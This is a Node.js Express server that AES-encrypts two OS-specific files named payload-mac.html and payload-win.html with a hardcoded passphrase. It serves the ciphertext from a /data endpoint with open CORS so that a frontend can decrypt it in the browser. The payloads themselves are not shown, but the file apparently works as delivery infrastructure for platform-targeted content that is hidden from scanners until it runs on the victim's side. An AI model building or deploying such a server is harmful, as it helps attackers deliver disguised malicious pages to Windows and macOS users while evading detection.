const express = require('express');
const cors = require("cors");
const fs = require('fs');
const path = require('path');
const CryptoJS = require('crypto-js');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

const PASSPHRASE = "98yNCjeAfWMwk0wI";

// Load payloads
const payloadMac = fs.readFileSync(path.join(__dirname, 'payload-mac.html'), 'utf8');
const payloadWin = fs.readFileSync(path.join(__dirname, 'payload-win.html'), 'utf8');

// CryptoJS AES encrypt (compatible with CryptoJS.AES.decrypt on frontend)
function encryptWithCryptoJS(content, passphrase) {
  const encrypted = CryptoJS.AES.encrypt(content, passphrase); 
  // returns a CryptoJS ciphertext string that CryptoJS can decrypt directly
  return encrypted.toString();
}

const encryptedMac = encryptWithCryptoJS(payloadMac, PASSPHRASE);
const encryptedWin = encryptWithCryptoJS(payloadWin, PASSPHRASE);

app.get('/data', (req, res) => {
  const platform = req.query.platform || 'win';
  const cipher = platform === 'mac' ? encryptedMac : encryptedWin;
  res.json({ cipher });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
